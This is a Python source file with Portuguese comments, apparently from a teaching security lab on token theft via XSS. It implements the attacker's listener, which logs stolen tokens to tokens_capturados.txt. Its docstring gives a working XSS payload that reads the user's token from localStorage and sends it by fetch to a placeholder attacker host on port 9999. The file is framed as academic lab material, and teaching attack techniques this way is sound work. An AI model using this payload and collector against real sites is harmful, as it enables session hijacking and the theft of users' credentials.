"""
Coletor de XSS - Laboratorio de Seguranca (financeiro26)
==========================================================

Representa o servidor do ATACANTE, usado no Laboratorio 5 (Roubo de token via
XSS). Nao faz parte da aplicacao financeiro26 - roda em outro terminal, como
se fosse uma maquina externa, e so serve para REGISTRAR o que chega ate ele.

Uso (didatico, apenas em ambiente local/academico):

    python coletor_xss.py

Por padrao escuta em 0.0.0.0:9999. O payload de XSS usado no laboratorio deve
apontar para o IP/porta desta maquina, por exemplo:

    <img src=x onerror="fetch('http://SEU_IP:9999/roubar?t='+
        JSON.parse(localStorage.getItem('usuario')).token)">

Cada token capturado e impresso no terminal e tambem salvo em
tokens_capturados.txt, no mesmo formato de uma exfiltracao real.
"""

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
from datetime import datetime

PORTA = 9999
ARQUIVO_LOG = "tokens_capturados.txt"


class ColetorHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self._processar()

    def do_POST(self):
        self._processar()

    def _processar(self):
        query = parse_qs(urlparse(self.path).query)
        token = query.get("t", [None])[0]

        if token:
            agora = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            origem = self.client_address[0]
            linha = f"[{agora}] token roubado de {origem}: {token}"
            print(f"\n{'=' * 60}\n{linha}\n{'=' * 60}\n")
            with open(ARQUIVO_LOG, "a", encoding="utf-8") as arquivo:
                arquivo.write(linha + "\n")
        else:
            print(f"Requisicao recebida sem token: {self.path}")

        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, format, *args):
        # silencia o log padrao do http.server; usamos nosso proprio formato acima
        pass


if __name__ == "__main__":
    print(f"[coletor] escutando em http://0.0.0.0:{PORTA} — aguardando tokens...")
    print(f"[coletor] tokens capturados tambem serao salvos em {ARQUIVO_LOG}")
    HTTPServer(("0.0.0.0", PORTA), ColetorHandler).serve_forever()
